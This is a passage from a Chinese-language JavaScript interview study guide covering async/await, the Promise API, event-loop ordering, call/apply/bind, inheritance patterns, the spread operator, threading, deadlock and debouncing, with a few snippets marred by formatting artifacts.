     3. async/await使得异步代码看起来像同步代码，这正是它的魔力所在。
   ```

   **一个函数如果加上 async ，那么该函数就会返回一个 Promise**

   ```js
   async function async1() {
     return "1"
   }
   console.log(async1()) // -> Promise {<resolved>: "1"}
   ```

   Generator函数依次调用三个文件那个例子用async/await写法，只需几句话便可实现

   ```js
   let fs = require('fs')
   function read(file) {
     return new Promise(function(resolve, reject) {
       fs.readFile(file, 'utf8', function(err, data) {
         if (err) reject(err)
         resolve(data)
       })
     })
   }
   async function readResult(params) {
     try {
       let p1 = await read(params, 'utf8')//await后面跟的是一个Promise实例
       let p2 = await read(p1, 'utf8')
       let p3 = await read(p2, 'utf8')
       console.log('p1', p1)
       console.log('p2', p2)
       console.log('p3', p3)
       return p3
     } catch (error) {
       console.log(error)
     }
   }
   readResult('1.txt').then( // async函数返回的也是个promise
     data => {
       console.log(data)
     },
     err => console.log(err)
   )
   // p1 2.txt
   // p2 3.txt
   // p3 结束
   // 结束
   ```

5.2 Async/Await并发请求

如果请求两个文件，毫无关系，可以通过并发请求

```js
   let fs = require('fs')
   function read(file) {
     return new Promise(function(resolve, reject) {
       fs.readFile(file, 'utf8', function(err, data) {
         if (err) reject(err)
         resolve(data)
       })
     })
   }
   function readAll() {
     read1()
     read2()//这个函数同步执行
   }
   async function read1() {
     let r = await read('1.txt','utf8')
     console.log(r)
   }
   async function read2() {
     let r = await read('2.txt','utf8')
     console.log(r)
   }
   readAll() // 2.txt 3.txt
```





### 32、 promise的介绍与使用

**Promise 介绍：**

ES6中的Promise 是异步编程的一种方案。从语法上讲，Promise 是一个对象，它可以获取异步操作的消息。

Promise对象, 可以**将异步操作以同步的流程表达出来**。使用 Promise 主要有以下好处：

- 可以很好地解决**回调地狱**的问题（避免了层层嵌套的回调函数）。
- 语法非常简洁。Promise 对象提供了简洁的API，使得控制异步操作更加容易。

**Promise 使用：**

**语法**

```js
var promise = new Promise((resolve, reject) => {/* executor函数 */
    // ... some code
    if (/* 异步操作成功 */){
        resolve(value);
    } else {
        reject(error);
    }
});
promise.then((value) => {
    //success
}, (error) => {
    //failure
})
```

1. 参数
   `executor` 函数在`Promise`构造函数执行时同步执行，被传递 `resolve` 和 `reject` 函数（`executor`函数在`Promise`构造函数返回新建对象前被调用）。
   `executor` 内部通常会执行一些异步操作，一旦完成，可以调用`resolve`函数来将`promise`状态改成`fulfilled`(完成)，或者将`promise`的状态改为`rejected`(失败)。
   如果在`executor`函数中抛出一个错误，那么该`promise` 状态为`rejected`。`executor`函数的返回值被忽略。
2. 简单使用

```jsx
function timeout(ms) {
    return new Promise((resolve, reject) => {
        setTimeout(resolve, ms, 'done');
    });
}

timeout(2000).then((value) => {
    console.log(value); //done
});
```

**原型方法**

Promise.prototype.then(onFulfilled, onRejected)

1. 语法
   `p.then(onFulfilled, onRejected);`
   `p.then((value) => {// fulfillment}, (reason) => {// rejection});`

2. 含义
   为 `Promise`实例添加状态改变时的回调函数。`then`方法的第一个参数是`resolved`状态的回调函数，第二个参数（可选）是`rejected`状态的回调函数。

3. 链式操作
   `then`方法返回的是一个新的`promise`，因此可以采用链式写法，即`then`方法后面再调用另一个`then`方法。

   ```js
   new Promise(resolve => {
       resolve(1);
   })
       .then(result => console.log(result)) //1
       .then(result => {
           console.log(result);              //undefined
           return 2;
       })
       .then(result => {
           console.log(result);             //2
           throw new Error("err");
       })
       .then((result) =>{
           console.log(result);            
       }, (err)=>{
           console.log(err);                //Error: err
           return 3;
       })
       .then((result) => {
           console.log(result);            //3
       })
   ```

   注意：①不管是`then`方法的`onfulfilled`函数参数执行还是`onrejected`（可选参数）函数参数执行，`then`方法返回的都是一个新的`Promise`对象，都可以继续采用链式写法调用另一个`then`方法。②`Promise.prototype.catch()`方法返回的也是一个`Promise`对象。`then`方法和`catch`方法可以链式操作。

4. 返回值
   `then`方法返回一个`Promise`，而它的行为与`then`中的被调用的回调函数(`onfulfilled`函数/`onrejected`函数)的返回值有关。
   (1) 如果`then`中的回调函数返回一个值，那么`then`返回的`Promise`将会成为接受状态，并且将返回的值作为接受状态的回调函数的参数值。

   ```js
   new Promise((resolve, reject) => {
       reject();
   })
   .then( () => 99, () => 42 )
   .then( result => console.log(result)); // 42
   ```

   (2) 如果`then`中的回调函数抛出一个错误，那么`then`返回的`Promise`将会成为拒绝状态，并且将抛出的错误作为拒绝状态的回调函数的参数值。

   ```js
   new Promise((resolve, reject) => {
       resolve();
   })
       .then( () => {throw new Error('err')}, () => {})
       .then( () => {}, (err) => {console.log(err)}); //Error: err
   ```

   (3) 如果`then`中的回调函数返回一个已经是接受状态的`Promise`，那么`then`返回的`Promise`也会成为接受状态，并且将那个`Promise`的接受状态的回调函数的参数值作为该被返回的`Promise`的接受状态回调函数的参数值。

   ```js
   new Promise((resolve, reject) => {
       resolve();
   })
       .then( () => {
           return new Promise(resolve => resolve('ok'));
       })
       .then( (result) => {console.log(result)}); //ok
   ```

   (4) 如果`then`中的回调函数返回一个已经是拒绝状态的`Promise`，那么`then`返回的`Promise`也会成为拒绝状态，并且将那个`Promise`的拒绝状态的回调函数的参数值作为该被返回的`Promise`的拒绝状态回调函数的参数值。

   ```js
   new Promise((resolve, reject) => {
       resolve();
   })
       .then( () => {
           return new Promise((resolve, reject) => {
              reject(new Error('err'));
           });
       })
       .then( () => {}, (err) => {console.log(err)}); //Error: err
   ```

   (5) 如果`then`中的回调函数返回一个未定状态（`pending`）的`Promise`，那么`then`返回`Promise`的状态也是未定的，并且它的终态与那个`Promise`的终态相同；同时，它变为终态时调用的回调函数参数与那个`Promise`变为终态时的回调函数的参数是相同的。

   ```js
   new Promise((resolve, reject) => {
       resolve();
   })
   .then(() => {
       return new Promise(resolve => {
           setTimeout(resolve, 2000, 'ok');
       });
   })
   .then( (result) => {console.log(result)}); //ok
   ```

   注意：这里是`then`方法中被调用回调函数的返回值与`then`方法返回的`Promise`对象状态之间的关系。

**Promise.prototype.catch(onRejected)**

1. 语法

   ```js
   p.catch(onRejected);
   
   p.catch(function(reason) {
       // 拒绝
   });
   ```

2. 含义
   `Promise.prototype.catch`方法是`.then(null, rejection)`的别名，用于指定发生错误时的回调函数，返回一个新的`promise`对象。

3. 用法

   ```js
   const p = new Promise((resolve,reject) => {
       return reject(new Error('err')); //reject方法的作用，等同于抛出错误
       //throw new Error('err');
   });
   
   p.then(null, (err) => {
       console.log(err);  //Err: err
   });
   
   //--------等价写法---------
   p.catch(err => {
       console.log(err); //Err: err
   })
   ```

   注意：由于`.catch`方法是`.then(null, rejection)`的别名，故`.then`中的链式操作(3)、返回值(4)等语法在`.catch`中都适用。

4. 一般总是建议，`Promise` 对象后面要跟`catch`方法，这样可以处理 `Promise`内部发生的错误。`catch`方法返回的还是一个 `Promise` 对象，因此后面还可以接着调用`then`方法。

5. `Promise`对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个`catch`语句捕获。 即：当前`catch`方法可以捕获上一个`catch`方法(包括上一个`catch`)到当前`catch`(不包括当前`catch`)方法之间所有的错误，如果没有错误，则当前`catch`方法不执行。

   ```
   new Promise(() => {
       throw new Error('err1');
   })
       .then(() => {console.log(1);})
       .then(() => {console.log(2);})
       .catch((err) => {
           console.log(err); //Err: err1
           throw  new Error('err2');
       })
       .catch((err) => {console.log(err);})//Err: err2
   ```

6. 一般来说，不要在`then`方法里面定义`Reject`状态的回调函数（即`then`的第二个参数），总是使用`catch`方法。

   ```js
   // bad
   new Promise()
       .then((data) => {/* success */ }, (err) => {/* error */ });
   
   // good
   new Promise()
       .then((data) => { /* success */ })
       .catch((err) => {/* error */ });
   ```

   上面代码中，第二种写法要好于第一种写法，理由是第二种写法可以捕获前面`then`方法执行中的错误，也更接近同步的写法。

7. 与传统的`try/catch`代码块不同的是，即使没有使用`catch`方法指定错误处理的回调函数，`Promise` 对象抛出的错误也不会中止外部脚本运行。

   ```js
   new Promise((resolve) => {
       // 下面一行会报错，因为x没有声明
       resolve(x + 2);
   }).then(() => {
       console.log('ok');
   });
   setTimeout(() => {console.log('over')});
   //Uncaught (in promise) ReferenceError: x is not defined
   //over
   ```

8. 在异步函数中抛出的错误不会被`catch`捕获到

   ```
   new Promise((resolve, reject) => {
       setTimeout(() => {
           throw 'Uncaught Exception!';
       }, 1000);
   }).catch(() => {
       console.log('err'); //不会执行
   });
   
   new Promise((resolve, reject) => {
       setTimeout(() => {
           reject();
       }, 1000);
   }).catch(() => {
       console.log('err'); //err
   });
   ```

9. 在`resolve()`后面抛出的错误会被忽略

   ```js
   new Promise((resolve, reject) => {
       resolve();
       throw 'Silenced Exception!';
   }).catch(function(e) {
       console.log(e); // 不会执行
   });
   ```

**Promise.all(iterable)**

1. 语法
   `var p = Promise.all([p1, p2, p3]);`

2. 含义
   `Promise.all`方法接受一个数组作为参数，`p1`、`p2`、`p3`都是 `Promise` 实例，如果不是，就会先调用下面讲到的`Promise.resolve`方法，将参数转为 `Promise` 实例，再进一步处理。（`Promise.all`方法的参数可以不是数组，但必须具有 `Iterator` 接口，且返回的每个成员都是 `Promise` 实例。）
   `p`的状态由`p1`、`p2`、`p3`决定，分成两种情况。
   (1) 只有`p1`、`p2`、`p3`的状态都变成`fulfilled`，`p`的状态才会变成`fulfilled`，此时`p1`、`p2`、`p3`的返回值组成一个数组，传递给`p`的回调函数。
   (2) 只要`p1`、`p2`、`p3`之中有一个被`rejected`，`p`的状态就变成`rejected`，此时第一个被`reject`的实例的返回值，会传递给`p`的回调函数。

3. 用法

   ```js
   const p1 = 'p1-ok';
   const p2 = Promise.resolve('p2-ok');
   const p3 = new Promise((resolve) => setTimeout(resolve, 3000, 'p3-ok'));
   const p4 = Promise.reject('p4-err');
   Promise.all([p1, p2, p3])
       .then((resolves) => {
         resolves.forEach(resolve => {
             console.log(resolve); //p1-ok   p2-ok  p3-ok
         });
       })
       .catch(() => {
         console.log('err');
       });
   
   Promise.all([p1, p2, p3, p4])
       .then(() => {
         console.log('ok');
       })
       .catch((err) => {
          console.log(err); //p4-err
       })
   ```

**Promise.race(iterable)**

1. 语法
   `var p = Promise.race([p1, p2, p3]);`

2. 含义
   `Promise.race`方法同样是将多个`Promise`实例，包装成一个新的`Promise`实例。只要`p1`、`p2`、`p3`之中有一个实例率先改变状态，`p`的状态就跟着改变。那个率先改变的 `Promise` 实例的返回值，就传递给`p`的回调函数。
   `Promise.race`方法的参数与`Promise.all`方法一样，如果不是 `Promise` 实例，就会先调用下面讲到的`Promise.resolve`方法，将参数转为`Promise`实例，再进一步处理。

3. 用法

   ```js
   var p1 = new Promise(resolve => {setTimeout(resolve, 500, "one");});
   var p2 = new Promise(resolve => {setTimeout(resolve, 100, "two");});
   Promise.race([p1, p2])
       .then(value => {
           console.log(value); // "two"
       });
   
   var p3 = new Promise(resolve => {setTimeout(resolve, 100, "three");});
   var p4 = new Promise((resolve, reject) => {setTimeout(reject, 500, "four");});
   
   Promise.race([p3, p4])
       .then((value) => {
           console.log(value); // "three"
       })
       .catch(err => {
           // 未被调用  
       });
   
   var p5 = new Promise(resolve => {setTimeout(resolve, 500, "five");});
   var p6 = new Promise((resolve, reject) => {
             setTimeout(reject, 100, "six");
         });
   
   Promise.race([p5, p6])
       .then((value) => {
         // 未被调用             
       }).catch((reason) => {
           console.log(reason); // "six"
       });
   ```

**Promise.resolve(value)**

1. 语法

   ```js
   Promise.resolve(value);
   Promise.resolve(promise);
   Promise.resolve(thenable);
   ```

   `Promise.resolve`等价于下面的写法。

   ```js
   Promise.resolve(value) ;
   // 等价于
   new Promise(resolve => resolve(value));
   ```

2. 含义
   返回一个状态由给定`value`决定的`Promise`实例。

3. 用法
   (1) 如果该值是一个`Promise`对象，则直接返回该对象；

   ```js
   const p = new Promise((resolve) => {resolve()});
   const p2 = Promise.resolve(p);
   console.log(p === p2); //true
   ```

   (2) 如果参数是`thenable`对象(即带有`then`方法的对象)，则返回的`Promise`对象的最终状态由`then`方法的执行决定；

   ```js
   const thenable = {
       then(resolve, reject) {
           resolve(42);
       }
   };
   Promise.resolve(thenable)
       .then((value) => {
           console.log(value);  // 42
       });
   ```

   (3) 如果参数是不具有`then`方法的对象或基本数据类型，则返回的`Promise`对象的状态为`fulfilled`，并且将该参数传递给`then`方法。

   ```js
   Promise.resolve('Hello')
       .then((s) => {
           console.log(s); //Hello
       });
   ```

   (4) 如果不带有任何参数，则返回的`Promise`对象的状态为`fulfilled`，并且将`undefined`作为参数传递给`then`方法。

   ```js
   Promise.resolve()
       .then((s) => {
           console.log(s); //undefined
       });
   ```

4. 通常而言，如果你不知道一个值是否是`Promise`对象，使用`Promise.resolve(value)` 来返回一个`Promise`对象,这样就能将该`value`以`Promise`对象形式使用。

5. 立即`resolve`的`Promise`对象，是在本轮“事件循环”（`event loop`）的结束时，而不是在下一轮“事件循环”的开始时。

   ```js
   setTimeout(function () {
       console.log('three');
   }, 0);
   
   Promise.resolve().then( () => {
       console.log('two');
   });
   
   console.log('one');
   // one 
   // two
   // three
   ```

**Promise.reject(reason)**

1. 语法

   ```js
   Promise.reject(reason);
   ```

   `Promise.reject`等价于下面的写法。

   ```js
   var p = Promise.reject(reason);
   // 等同于
   var p = new Promise((resolve, reject) => reject(reason));
   ```

2. 含义
   返回一个状态为`rejected`的`Promise`对象，并将给定的失败信息传递给对应的处理方法。

> **注意：`Promise.resolve(value)`方法返回的`Promise`实例的状态由`value`决定，可能是`fulfilled`，也可能是`rejected`。`Promise.reject(reason)`方法返回的`Promise`实例的状态一定是`rejected`。**

1. 用法

   ```js
   Promise.reject("Testing static reject")
       .then((value) => {
           // 未被调用
       }).catch((reason) => {
           console.log(reason); // Testing static reject
       });
   
   Promise.reject(new Error("fail"))
       .then((value) => {
           // 未被调用
       }).catch((error) => {
           console.log(error); // Error: fail
       });
   ```

2. `Promise.reject()`方法的参数，会原封不动地作为`reject`的理由，变成后续方法的参数。这一点与`Promise.resolve`方法不一致。

   ```js
   const thenable = {
       then(resolve) {
           resolve('ok');
       }
   };
   
   Promise.resolve(thenable)
       .then(e => {
           console.log(e === 'ok'); //true
       });
   
   Promise.reject(thenable)
       .catch(e => {
           console.log(e === thenable); // true
       });
   ```



**与promise.all相反的是哪一个**

**参考答案：**

Promse.race就是赛跑的意思，意思就是说，Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。

**扩展：**

语法

```
Promise.race(iterable);
```

参数

- iterable

  可迭代对象，类似`Array`

返回值

 一个**待定的** `Promise`]只要给定的迭代中的一个promise解决或拒绝，就采用第一个promise的值作为它的值， 从而**异步**地解析或拒绝（一旦堆栈为空）



33、promise实现文件读取

```js
// const fs = require("fs");
import fs from "fs";
import path from "path";
const __dirname = path.resolve();
function readFile(file) {
  return new Promise((resolve, reject) => {
    fs.readFile(path.join(__dirname, file), (err, data) => {
      if (data) {
        resolve(data.toString());
      } else {
        reject(err);
      }
    });
  });
}

readFile("./JavaScript/promise/file/file1.txt")
  .then((data) => {
    console.log(data);
    return readFile("./JavaScript/promise/file/file1.txt");
  })
  .then((data) => {
    console.log(data);
  });

```



### 33、用js实现sleep，用promise

```js
function SLeep_p(time) {
  return new Promise((resolve, reject) => {
    setTimeout(resolve, time);
  });
}

SLeep_p(2000).then(() => {
  console.log("kif");
});
```





### 34、js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.then

```js
console.time('start');

setTimeout(function() {
  console.log(2);
}, 10);

setImmediate(function() {
  console.log(1);
});

new Promise(function(resolve) {
  console.log(3);
  resolve();
  console.log(4);
}).then(function() {
  console.log(5);
  console.timeEnd('start')
});

console.log(6);

process.nextTick(function() {
  console.log(7);
});

console.log(8);
```

**参考答案：**

综合的执行顺序就是： `3——>4——>6——>8——>7——>5——>start: 7.009ms——>1——>2`

**解析：**

本题目，考察的就是 node 事件循环 Event Loop 我们可以简单理解Event Loop如下：

1. 所有任务都在主线程上执行，形成一个执行栈(Execution Context Stack)
2. 在主线程之外还存在一个任务队列(Task Queen),系统把异步任务放到任务队列中，然后主线程继续执行后续的任务
3. 一旦执行栈中所有的任务执行完毕，系统就会读取任务队列。如果这时异步任务已结束等待状态，就会从任务队列进入执行栈，恢复执行
4. 主线程不断重复上面的第三步

在上述的例子中，我们明白首先执行主线程中的同步任务，因此依次输出`3、4、6、8`。当主线程任务执行完毕后，再从Event Loop中读取任务。

Event Loop读取任务的先后顺序，取决于任务队列（Job queue）中对于不同任务读取规则的限定。

在Job queue中的队列分为两种类型：

`宏任务 Macrotask` 宏任务是指Event Loop在**每个阶段**执行的任务

`微任务 Microtask` 微任务是指Event Loop在**每个阶段之间**执行的任务

我们举例来看执行顺序的规定，我们假设

宏任务队列包含任务: A1, A2 , A3

微任务队列包含任务: B1, B2 , B3

执行顺序为，首先执行宏任务队列开头的任务，也就是 A1 任务，执行完毕后，在执行微任务队列里的所有任务，也就是依次执行B1, B2 , B3，执行完后清空微任务队中的任务，接着执行宏任务中的第二个任务A2，依次循环。

了解完了`宏任务 Macrotask`和`微任务 Microtask`两种队列的执行顺序之后，我们接着来看，真实场景下这两种类型的队列里真正包含的任务（我们以node V8引擎为例），在node V8中，这两种类型的真实任务顺序如下所示：

宏任务 Macrotask队列真实包含任务：

```
script(主程序代码),setTimeout, setInterval, setImmediate, I/O, UI rendering
```

微任务 Microtask队列真实包含任务：

```
process.nextTick, Promises, Object.observe, MutationObserver
```

由此我们得到的执行顺序应该为：

```
script(主程序代码)—>process.nextTick—>Promises...——>setTimeout——>setInterval——>setImmediate——> I/O——>UI rendering
```

> 在ES6中宏任务 Macrotask队列又称为ScriptJobs，而微任务 Microtask又称PromiseJobs

我们的题目相对复杂，但是要注意，我们在定义promise的时候，promise构造部分是同步执行的

接下来我们分析我们的题目，首先分析Job queue的执行顺序：

```
script(主程序代码)——>process.nextTick——>promise——>setTimeout——>setImmediate
```

- 主体部分： 定义promise的构造部分是同步的，因此先输出3、4 ，主体部分再输出6、8（同步情况下，就是严格按照定义的先后顺序）
- process.nextTick: 输出7
- promise： 这里的promise部分，严格的说其实是promise.then部分，输出的是5、以及 timeEnd('start')
- setImmediate：输出1，依据上面优先级，应该先setTimeout，但是注意，setTimeout 设置 10ms 延时
- setTimeout ： 输出2



### 35、call appy bind的作用和区别

**参考答案：**

作用：

 都可以改变函数内部的this指向。

区别点：

1. call 和 apply 会调用函数，并且改变函数内部this指向。
2. call 和 apply 传递的参数不一样，call 传递参数arg1,arg2...形式 apply 必须数组形式[arg]
3. bind 不会调用函数，可以改变函数内部this指向。

**解析：**

call方法

改变函数内部this指向

call()方法调用一个对象。简单理解为调用函数的方式，但是它可以改变函数的this指向。

写法：fun.call(thisArg, arg1, arg3, ...) // thisArg为想要指向的对象，arg1,arg3为参数

call 的主要作用也可以实现继承

```

```

apply方法

apply()方法调用一个函数。简单理解为调用函数的方式，但是它可以改变函数的this指向。

写法：fun.apply(thisArg, [argsArray])

- thisArg:在fun函数运行时指定的this值
- argsArray:传递的值，必须包含在数组里面
- 返回值就是函数的返回值，因为他就是调用函数

apply的主要应用，比如可以利用apply可以求得数组中最大值

```
const arr = [1, 22, 3, 44, 5, 66, 7, 88, 9];``const max = Math.max.apply(Math, arr);``console.log(max);
```

bind方法

bind()方法不会调用函数，但是能改变函数内部this指向

写法：fun.bind(thisArg, arg1, arg2, ...)

- thisArg:在fun函数运行时指定的this值
- arg1,arg2:传递的其他参数
- 返回由指定的this值和初始化参数改造的原函数拷贝

```
var` `o = {``  ``name: ``"lisa"``};``function` `fn() {``  ``console.log(``this``);``}``var` `f = fn.bind(o);``f();
```

bind应用

如果有的函数我们不需要立即调用，但是又需要改变这个函数的this指向，此时用bind再合适不过了

```
const btns = document.querySelectorAll(``"button"``);``for` `(let i = 0; i < btns.length; i++) {``  ``btns[i].onclick = ``function``() {``   ``this``.disabled = ``true``;``   ``setTimeout(``    ``function``() {``     ``this``.disabled = ``false``;``    ``}.bind(``this``),``    ``2000``   ``);``  ``};``}
```

**扩展:**

主要应用场景：

1. call 经常做继承。
2. apply 经常跟数组有关系，比如借助于数学对象实现数组最大值最小值。
3. bind 不调用函数，但是还想改变this指向，比如改变定时器内部的this指向。



### 36、继承，优缺点

**参考答案：**

- 继承的好处
  - a：提高了代码的复用性
  - b：提高了代码的维护性
  - c：让类与类之间产生了关系，是多态的前提
- 继承的弊端
  - 类的耦合性增强了,但是开发的原则：高内聚，低耦合。





### 37、ES5 js继承的方法和优缺点

**参考答案：**

1. 原型链继承

   实现方式：将子类的原型链指向父类的对象实例

   ```js
   function Parent(){
     this.name = "parent";
     this.list = ['a'];
   }
   Parent.prototype.sayHi = function(){
     console.log('hi');
   }
   function Child(){
   
   }
   Child.prototype = new Parent();
   var child = new Child();
   console.log(child.name);
   child.sayHi();
   ```

   原理：子类实例child的`__proto__`指向Child的原型链prototype，而Child.prototype指向Parent类的对象实例，该父类对象实例的`__proto__`指向Parent.prototype,所以Child可继承Parent的构造函数属性、方法和原型链属性、方法
   优点：可继承构造函数的属性，父类构造函数的属性，父类原型的属性
   缺点：无法向父类构造函数传参；且所有实例共享父类实例的属性，若父类共有属性为引用类型，一个子类实例更改父类构造函数共有属性时会导致继承的共有属性发生变化；实例如下：

   ```js
   var a = new Child();
   var b = new Child();
   a.list.push('b');
   console.log(b.list); // ['a','b']
   ```

2. 构造函数继承

   实现方式：在子类构造函数中使用call或者apply劫持父类构造函数方法，并传入参数

   ```js
   function Parent(name, id){
     this.id = id;
     this.name = name;
     this.printName = function(){
       console.log(this.name);
     }
   }
   Parent.prototype.sayName = function(){
     console.log(this.name);
   };
   function Child(name, id){
     Parent.call(this, name, id);
     // Parent.apply(this, arguments);
   }
   var child = new Child("jin", "1");
   child.printName(); // jin
   child.sayName() // Error
   ```

   原理：使用call或者apply更改子类函数的作用域，使this执行父类构造函数，子类因此可以继承父类共有属性
   优点：可解决原型链继承的缺点
   缺点：不可继承父类的原型链方法，构造函数不可复用

3. 组合继承

   原理：综合使用构造函数继承和原型链继承

   ```js
   function Parent(name, id){
     this.id = id;
     this.name = name;
     this.list = ['a'];
     this.printName = function(){
       console.log(this.name);
     }
   }
   Parent.prototype.sayName = function(){
     console.log(this.name);
   };
   function Child(name, id){
     Parent.call(this, name, id);
     // Parent.apply(this, arguments);
   }
   Child.prototype = new Parent();
   var child = new Child("jin", "1");
   child.printName(); // jin
   child.sayName() // jin
   
   var a = new Child();
   var b = new Child();
   a.list.push('b');
   console.log(b.list); // ['a']
   ```

   优点：可继承父类原型上的属性，且可传参；每个新实例引入的构造函数是私有的
   缺点：会执行两次父类的构造函数，消耗较大内存，子类的构造函数会代替原型上的那个父类构造函数

4. 原型式继承

   原理：类似Object.create，用一个函数包装一个对象，然后返回这个函数的调用，这个函数就变成了个可以随意增添属性的实例或对象，结果是将子对象的`__proto__`指向父对象

   ```js
   var parent = {
     names: ['a']
   }
   function copy(object) {
     function F() {}
     F.prototype = object;    
     return new F();
   }
   var child = copy(parent);
   ```

   缺点：共享引用类型

5. 寄生式继承

   原理：二次封装原型式继承，并拓展

   ```js
   function createObject(obj) {
     var o = copy(obj);
     o.getNames = function() {
       console.log(this.names);
       return this.names;
     }
     return o;
   }
   ```

   优点：可添加新的属性和方法

6. 寄生组合式继承

   原理：改进组合继承，利用寄生式继承的思想继承原型

   ```js
   function inheritPrototype(subClass, superClass) {
     // 复制一份父类的原型
     var p = copy(superClass.prototype);
     // 修正构造函数
     p.constructor = subClass;
     // 设置子类原型
     subClass.prototype = p;
   }
   
   function Parent(name, id){
     this.id = id;
     this.name = name;
     this.list = ['a'];
     this.printName = function(){
       console.log(this.name);
     }
   }
   Parent.prototype.sayName = function(){
     console.log(this.name);
   };
   function Child(name, id){
     Parent.call(this, name, id);
     // Parent.apply(this, arguments);
   }
   inheritPrototype(Child, Parent);
   ```



![](https://static.nowcoder.com/images/activity/2021jxy/front/images/16cc75d62ddf654f.png)



### 38、ES6继承



```js
class Parent {
  constructor() {
    this.name = "kif";
    this.age = 12;
  }
}
class Child extends Parent {
  constructor(id) {
    super();
    this.id = id;
  }
}

let p = new Child();
console.log(p.name);
```



![](https://static.nowcoder.com/images/activity/2021jxy/front/images/16cc75d62ddf654f11.png)



### 39、扩展操作符...

**适用类型**：数组、对象、字符串。

复杂数据类型都可以，当要转化为可迭代数据结构时可设置对象的迭代器对扩展运算符扩展出来的值进行操作。

基础数据只有string可以使用扩展运算符，number,boolean,null,undefined无效



**扩展运算符的应用场景**

```js
// 1、函数调用
function add(x, y) {
  return x + y;
}
add(...[4, 38]);

function f(v, w, x, y, z) {  }
f(-1, ...[0, 1], 2, ...[3]);
// 123456789

//2.往数组里push多个元素
var arr1 = [0, 1, 2];
var arr2 = [3, 4, 5];
arr1.push(...arr2);  
console.log(arr1); //[0,1,2,3,4,5]
//123456

//3.替代函数的apply方法
function f(x, y, z) {  }  
var args = [0, 1, 2];
f.apply(null, args); //ES5 的写法
f(...args); //ES6的写法
// 123456

//4.求一个数组的最大数简化
Math.max.apply(null, [14, 3, 77])  //ES5 的写法
Math.max(...[14, 3, 77])  //ES6 的写法，等同于Math.max(14, 3, 77)
//1234

//5.扩展运算符后面可以放表达式
const arr = [...(5 > 0 ? ['a'] : []),'b'];
console.log(arr);  //['a','b'] 
//1234

//6.与解构赋值结合，用于生成数组
const a1 = [1, 2];
const a2 = [...a1];  //写法1
const [...a2] = a1;  //写法2
const [first, ...rest] = [1, 2, 3, 4, 5];
first  //1
rest  //[2, 3, 4, 5]

const [first, ...rest] = [];
first  //undefined
rest  //[]

const [first, ...rest] = ["foo"];
first  //"foo"
rest   //[]
//1234567891011121314151617

//7.合并数组
[...arr1, ...arr2, ...arr3]  //[ 'a', 'b', 'c', 'd', 'e' ]


//8.数组的克隆——————————————————————特别注意
var arr1 = [0, 1, 2];
var arr2 = [...arr1];
arr1[0]=100;
console.log(arr2); //[0, 1, 2]  

/* 乍一看，arr2与arr1不共用引用地址，arr2不随着arr1变化，接着往下看 */

var arr1 = [0, [1,11,111], 2];
var arr2 = [...arr1];
arr1[1][0]=100;
console.log(arr2); //[0, [100,11,111], 2]
```

### 40、为什么js是单线程

**参考答案：**

这主要和js的用途有关，js是作为浏览器的脚本语言，主要是实现用户与浏览器的交互，以及操作dom；这决定了它只能是单线程，否则会带来很复杂的同步问题。 举个例子：如果js被设计了多线程，如果有一个线程要修改一个dom元素，另一个线程要删除这个dom元素，此时浏览器就会一脸茫然，不知所措。所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变

**扩展：**

什么是进程？

进程：是cpu分配资源的最小单位；（是能拥有资源和独立运行的最小单位）

什么是线程？

线程：是cpu调度的最小单位；（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）

浏览器是多进程的？

放在浏览器中，每打开一个tab页面，其实就是新开了一个进程，在这个进程中，还有ui渲染线程，js引擎线程，http请求线程等。 所以，浏览器是一个多进程的。

为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。



### 41、死锁

**参考答案：**

死锁是指两个或两个以上的进程在执行过程中，由于竞争资源而造成阻塞的现象，若无外力作用，它们都将无法继续执行

产生原因

- 竞争资源引起进程死锁
- 可剥夺和非剥夺资源
- 竞争非剥夺资源
- 竞争临时性资源
- 进程推进顺序不当

产生条件

1. 互斥条件：涉及的资源是非共享的
   - 涉及的资源是非共享的,一段时间内某资源只由一个进程占用,如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放
2. 不剥夺条件：不能强行剥夺进程拥有的资源
   - 进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放
3. 请求和保持条件：进程在等待一新资源时继续占有已分配的资源
   - 指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放 
4. 环路等待条件：存在一种进程的循环链，链中的每一个进程已获得的资源同时被链中的下一个进程所请求 在发生死锁时，必然存在一个进程——资源的环形链

解决办法

只要打破四个必要条件之一就能有效预防死锁的发生



### 42、面向对象的三个特征，分别说一下什么意思

**参考答案：**

概念：

**封装：**将对象运行所需的资源封装在程序对象中——基本上，是方法和数据。对象是“公布其接口”。其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象。这个概念就是“不要告诉我你是怎么做的，只要做就可以了。”对象可以看作是一个自我包含的原子。对象接口包括了公共的方法和初始化数据。

**继承：** 继承可以解决代码复用，让编程更加靠近人类思维。当多个类存在相同的属性(变量)和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过继承父类中的属性和方法。

**多态：** 多态是指一个引用(类型)在不同情况下的多种状态。也可以理解成：多态是指通过指向父类的引用，来调用在不同子类中实现的方法。

特点：

**封装**可以隐藏实现细节，使得代码模块化；

**继承**可以扩展已存在的代码模块（类），它们的目的都是为了——代码重用。

**多态**就是相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。多态分为两种，一种是行为多态与对象的多态





### 43、防抖和节流的原理和使用场景

**参考答案：**

函数防抖和函数节流：优化高频率执行js代码的一种手段，js中的一些事件如浏览器的resize、scroll，鼠标的mousemove、mouseover，input输入框的keypress等事件在触发时，会不断地调用绑定在事件上的回调函数，极大地浪费资源，降低前端性能。为了优化体验，需要对这类事件进行调用次数的限制。

**防抖：**

在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。

根据函数防抖思路设计出第一版的最简单的防抖代码：

```
var timer; // 维护同一个timer
function debounce(fn, delay) {
    clearTimeout(timer);
    timer = setTimeout(function(){
        fn();
    }, delay);
}
```

